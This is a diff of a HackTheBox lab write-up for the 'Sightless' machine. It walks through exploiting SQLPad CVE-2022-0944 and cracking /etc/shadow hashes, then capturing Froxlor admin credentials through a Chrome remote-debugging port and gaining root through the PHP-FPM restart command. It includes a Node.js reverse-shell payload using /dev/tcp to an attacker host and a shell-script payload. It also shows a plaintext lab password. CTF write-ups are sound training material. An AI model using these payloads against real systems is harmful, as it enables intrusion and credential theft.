@@ -3,7 +3,7 @@ title: Sightless - HackTheBox
 authors: Samarth
 date: 2024-12-01 16:30:00 +0530
 categories: [HackTheBox Machines]
-tags: [Linux, FTPd, Web, CVE-2022-0944,  ]
+tags: [Linux, FTPd, Web, CVE-2022-0944, SQLPad, Froxlor]
 math: true
 mermaid: true
 ---
@@ -16,7 +16,7 @@ mermaid: true
 
 ## Scanning Network
 
-I started with a Nmap scan and found ports 21, 22, and 80, corresponding to ProFTPD Server, OpenSSH and Nginx 1.18.0. Let's review the Nmap result.
+I began by performing an Nmap scan, which revealed open ports 21, 22, and 80, corresponding to ProFTPD Server, OpenSSH, and Nginx 1.18.0. Here are the results from the Nmap scan:
 
 ```bash
 nmap -sC -sV -A -T4 -Pn 10.10.11.32 -oN scan/normal.scan
@@ -46,17 +46,17 @@ SF:y\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20
 SF:being\x20more\x20creative\r\n");
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-I have discovered two services: SSH and HTTP. Let's begin by enumerating the HTTP service. Allow us to delve into the enumeration phase.
+Two services, SSH and HTTP, were detected. Let’s proceed with enumerating the HTTP service.
 
 ## Enumeration
 
-I have observed that in Nmap scan, IP address gives us a reference to a domain name `sightless.htb`. So, we have to add this domain to `"/etc/hosts"` file.
+The Nmap scan reveals that the IP address is linked to the domain name `sightless.htb`. Therefore, we need to add this domain to the `"/etc/hosts"` file.
 
-Let's open [__http://slightless.htb/__]().
+Now, let's visit [__http://slightless.htb/__]().
 
 ![Browser View](/assets/images/writeups/Sightless-HTB/1.png)
 
-Let's initiate directory fuzzing to discover any potentially interesting directories or parameters.
+Let's begin directory fuzzing to identify any hidden directories or parameters.
 
 ```bash
 wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -u http://sightless.htb/FUZZ --hc 404,403
@@ -76,23 +76,27 @@ ID           Response   Lines    Word       Chars    Payload
 000006462:   301        7 L      12 W       178 Ch   "icones"  
 ```
 
-I haven't found anything interesting while directory fuzzing. Let's browse the website and try to find some information.
+Unfortunately, no interesting directories were discovered during fuzzing. Let’s browse the website to look for valuable information.
 
-While browsing the website, I have found one subdomain `sqlpad.sightless.htb`.
+While navigating the site, I discovered a subdomain, `sqlpad.sightless.htb`.
 
 ![Subdomain Browser View](/assets/images/writeups/Sightless-HTB/2.png)
 
-Let's browse the SQLPad website and enumerate it to run SQL queries or find something interesting.
+Let's browse the `SQLPad` website and enumerate it to run SQL queries or find something interesting.
 
 ![SQLPad Version](/assets/images/writeups/Sightless-HTB/3.png)
 
-I have found `SQLPad` version as `6.10.0`. Let's browse Google and try to find exploit for this SQLPad version if any exists.
-
-SQLPad version 6.10.0 is vulnerable to [__CVE-2022-0944__](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944). 
+The SQLPad version identified was `6.10.0`. After researching, I found that this version is vulnerable to [__CVE-2022-0944__](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944). 
 
 ## Exploitation
 
-`CVE-2022-0944` - Template injection in connection test endpoint leads to RCE in GitHub repository sqlpad/sqlpad prior to 6.10.1.
+`CVE-2022-0944` - This vulnerability allows for template injection via the `/api/test-connection` endpoint in SQLPad versions before 6.10.1, resulting in remote code execution (RCE).
+
+As SQLPad is built with Node.js, I used the `child_process` module to execute arbitrary commands.
+
+Payload - `process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/{args.attacker_ip}/{args.attacker_port} 0>&1"');`
+
+I utilized the Python-based [__SQLPad RCE Exploit__](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944) for this.
 
 Let's use this exploit to perform template injection in new SQLPad query. 
 
@@ -100,7 +104,7 @@ Let's use this exploit to perform template injection in new SQLPad query.
 python3 exploit.py http://sqlpad.sightless.htb/ <Listener IP> <Listener Port>
 ```
 
-The above exploit requires target, listener IP address and listener port. Before using the above exploit, let's open netcat listener on port 4444. Exploit will send the query to the server and server initiate new connection along with payload and then send back the shell to netcat listener.
+The above exploit requires the target URL, listener IP, and listener port. Before executing, let's open a netcat listener on port 4444. The exploit sends the query to the server, which initiates a connection and sends back a shell to the netcat listener.
 
 ```bash
 python3 exploit.py http://sqlpad.sightless.htb/ 10.10.14.70 4444
@@ -109,18 +113,15 @@ Response body: {"title":"connect ECONNREFUSED 127.0.0.1:3306"}
 Exploit sent, but server responded with status code: 400. Check your listener.
 ```
 
-Once the exploit sent to the server, let's check netcat listener if the shell is received or not.
+After sending the exploit, I checked the netcat listener for the shell.
 
 ![Netcat Listener](/assets/images/writeups/Sightless-HTB/4.png)
 
-
-It's surprising to see the direct root access to the system. But while browsing directories, I have found `.dockerenv` which confirms that the application is running in a docker container.
+To my surprise, I received root access directly. While browsing the directories, I noticed the presence of `.dockerenv`, confirming that the application runs in a Docker container.
 
 ![Docker Container](/assets/images/writeups/Sightless-HTB/5.png)
 
-While inspecting system's user, I got two usernames `michael` and `node`. It seems that the application is running under some user contexts, which could provide opportunity to carry further exploitation.
-
-### User Flag
+Upon examining the system's users, I found two usernames: michael and node. These may provide additional opportunities for exploitation.
 
 As now I have access to some user, let's check `/etc/passwd` and `/etc/shadow` files and will crack the hash using `unshadow`.
 
@@ -132,7 +133,7 @@ Accessing `/etc/shadow`
 
 ![/etc/shadow](/assets/images/writeups/Sightless-HTB/7.png)
 
-I will be using `unshadow` tool to combine content of `/etc/passwd` and `/etc/shadow`.
+I have used `unshadow` tool to combine content of `/etc/passwd` and `/etc/shadow`.
 
 ```bash
 unshadow passwd shadow > passwd_shadow_combined
@@ -140,7 +141,7 @@ unshadow passwd shadow > passwd_shadow_combined
 
 ![unshadow](/assets/images/writeups/Sightless-HTB/8.png)
 
-Let's use `john` to crack the hash and find the password.
+Now, let's use `john` to crack the hashes and find the passwords.
 
 ![Root's and Michael's Password](/assets/images/writeups/Sightless-HTB/9.png)
 
@@ -150,12 +151,11 @@ Let's utilise the username as `michael` and use the above password to login usin
 
 ![Michael shell](/assets/images/writeups/Sightless-HTB/10.png)
 
+## Post Exploitation
 
-### Root Flag (Post Exploitation)
+I checked the current user's privileges using `sudo -l`, but `michael` does not belong to the sudoers group.
 
-I tried checking current user's privilege by running `sudo -l` but `michael` doesn't belongs to sudeors group.
-
-Let's find SUID files execute with the permission of their owner.
+Next, I searched for SUID files that are executable with their owner's permissions.
 
 ```bash
 find / -perm /4000 2>/dev/null
@@ -163,66 +163,64 @@ find / -perm /4000 2>/dev/null
 
 ![Files with permission](/assets/images/writeups/Sightless-HTB/11.png)
 
-I have tried to misconfigure executables to see if it's exploitable but no success. So, here I will be using Linpeas to find interesting files, directories, processes,etc.
+After testing for misconfigurations, I used Linpeas to identify potentially exploitable files, directories, and processes.
 
-While running Linpeas, I came across to VirtualHost which is using `127.0.0.1:8080` to run Froxlor service.
+During this, I discovered a `127.0.0.1:8080` VirtualHost that runs the Froxlor service.
+
+Froxlor is a web hosting control panel. Let's check the active TCP connections and processes using `telnet -tnlp`.
 
 `Froxlor` is a lightweight, open-source web hosting control panel designed to manage hosting environments efficiently. It provides an intuitive graphical interface for users, resellers, and administrators to manage their web hosting accounts, domains, email, FTP, and more. Froxlor is often used as an alternative to popular control panels like cPanel and Plesk.
 
-Let's find active TCP network connections, listening ports, and the corresponding process information using `telnet -tnlp`.
-
 ![netstat -tnlp](/assets/images/writeups/Sightless-HTB/12.png)
 
-I have found `127.0.0.1:8080` might be used by Froxlor service. Let's do port forwarding into my machine's ip.
+I identified that `127.0.0.1:8080` is likely used by the Froxlor service. I proceeded with port forwarding to my machine's IP.
 
 ![Froxlor](/assets/images/writeups/Sightless-HTB/13.png)
 
-
-While browsing for sometime and reviewing running processes in the system. I came across remote debugging port. I realised that `Google Chrome Debugger` can help me to debug the web application. `Google Chrome Debugger` is a tool that debug web application if the running Google Chrom debugger at specific port `--remote-debugging-port=<port>`. Let's use [__Chrome Remote Debugger Pentesting__](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/) methodology to debug web applications.
+While browsing and reviewing the running processes on the system, I came across a remote debugging port. I realized that the Google Chrome Debugger could assist in debugging the web application. The `Google Chrome Debugger` is a tool that allows debugging of web applications when the Google Chrome debugger is running on a specific port using the `--remote-debugging-port=<port>` flag. Let's use [__Chrome Remote Debugger Pentesting__](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/) methodology to debug web applications.
 
 ![Remote Debugging Port](/assets/images/writeups/Sightless-HTB/14.png)
 
-`remote-debugging-port=0`, it means that the remote debugging feature of Google Chrome (or any Chromium-based browser) will not have a fixed port. Instead, Chrome will dynamically assign an available port for remote debugging. 
+The `remote-debugging-port=0` configuration means that the remote debugging feature of Google Chrome (or any Chromium-based browser) will not use a fixed port. Instead, Chrome will dynamically assign an available port for remote debugging.
 
-For identifying all the active TCP connections, I will use `netstat -tnlp`.
+To identify all active TCP connections, I will use the command `netstat -tnlp`.
 
 ![Netstat -tnlp](/assets/images/writeups/Sightless-HTB/15.png)
 
-There are so many ports active for TCP connections, I will be using each of the ports one by one to port forwarding until I receive connection on Chrome Debugger. Once the port forwarding is initiated, I will be using Google Chrome Debugger (`chrome://inspect/#devices`). 
+There were many active ports for TCP connections, so I used each port one by one for port forwarding until I established a connection with the Chrome Debugger. Once port forwarding was initiated, I accessed the Google Chrome Debugger via `chrome://inspect/#devices`.
 
-I will be starting target discovery on Chrome Developer Toolfor that specific port which I have used during port forwarding to see if the connection is successful.
+I then began the target discovery in Chrome Developer Tools for the specific port used during port forwarding to check if the connection was successful.
 
-I will be starting with highest port `45553` to start port forwarding and same for chrome debugger.
-
+I started with the highest port, `45553`, for port forwarding and used the same port for the Chrome Debugger.
 ```bash
 ssh -L 45553:127.0.0.1:45553 michael@10.10.11.32
 ```
 
 ![Port Forwarding](/assets/images/writeups/Sightless-HTB/16.png)
 
-Once the port forwarding is initiated, I will be `Inspect with Chrome Developer Tool` (`chrome://inspect/#devices`).
+Once the port forwarding was initiated, I inspected with Chrome Developer Tools (`chrome://inspect/#devices`).
 
 ![Chrome Debugger Tool](/assets/images/writeups/Sightless-HTB/17.png)
 
-Once I started the Chrome Debugger, I received the remote target access. While inspecting the web application. I have received the login credential for `Froxlor` service.
+Once I started the Chrome Debugger, I received remote target access. While inspecting the web application, I received the login credentials for the `Froxlor` service.
 
 ![Admin Credential](/assets/images/writeups/Sightless-HTB/18.png)
 
-Let's utilise the credential and login as Admin to `Froxlor` login panel.
+Let's utilize the credentials and log in as Admin to the `Froxlor` login panel.
 
 `admin:ForlorfroxAdmin`
 
 ![Froxlor Dashboard](/assets/images/writeups/Sightless-HTB/19.png)
 
-Dashboard reveals the version of `Froxlor` that is `2.1.8`. While browsing, I came across towards `PHP-FPM`. Let's understand what `PHP-FPM` does.
+The dashboard revealed that the version of `Froxlor` was `2.1.8`. While browsing, I came across `PHP-FPM`. Let's understand what `PHP-FPM` does.
 
-FPM (FastCGI Process Manager) is a primary PHP FastCGI implementation containing some features (mostly) useful for heavy-loaded sites.
+FPM (FastCGI Process Manager) is a primary PHP FastCGI implementation, containing features that are mostly useful for heavily loaded sites.
 
-FPM requires `php-fpm restart command`, `configuration directory of php-fpm` and `process manager control`. Let's combine `Froxlor` version and `PHP-FPM` and search if any any vulnerability exist for this version.
+FPM requires the `php-fpm restart command`, the `configuration directory of php-fpm`, and the `process manager control`. Let's combine the `Froxlor` version and `PHP-FPM` and search to see if any vulnerabilities exist for this version.
 
 I searched for `Froxlor RCE` and I have found this blog [__Disclosing Froxlor V2.x Authenticated RCE as Root Vulnerability via PHP-FPM__](https://sarperavci.com/Froxlor-Authenticated-RCE/).
 
-The vulnerability allows to run arbitrary command in `php-fpm restart command` parameter. In the above blog, it is explained that there are couple of steps to follow to exploit the vulnerability.
+The vulnerability allows running arbitrary commands in the `php-fpm restart command` parameter. In the blog above, it is explained that there are a couple of steps to follow in order to exploit the vulnerability.
 
 __1.__ `First` - Create a one liner reverse shell
 
@@ -244,14 +242,13 @@ __3.__ `Third` - Provide the following payload to `php-fpm restart command` para
 /bin/bash /tmp/shell.sh
 ```
 
-
 ![PHP-FPM restart command](/assets/images/writeups/Sightless-HTB/20.png)
 
-Once you provided command, save the setting and start listener at attacker's machine.
+Once the command is provided, save the settings and start the listener on the attacker's machine.
 
-After setting the custom `PHP-FPM restart command`, go to `System` -> `Settings` and click on `PHP-FPM`. After that, click on disable, wait for a few seconds, and click on enable. This will restart the PHP-FPM service and execute the reverse shell.
+After setting the custom `PHP-FPM restart command`, go to `System` -> `Settings` and click on `PHP-FPM`. Then, click on disable, wait for a few seconds, and click on enable. This will restart the PHP-FPM service and execute the reverse shell.
 
-Let's wait for few minute and then check listener to see if I have got the root shell or not.
+Let's wait for a few minutes and then check the listener to see if the root shell has been obtained.
 
 ![Root Shell](/assets/images/writeups/Sightless-HTB/21.png)
 
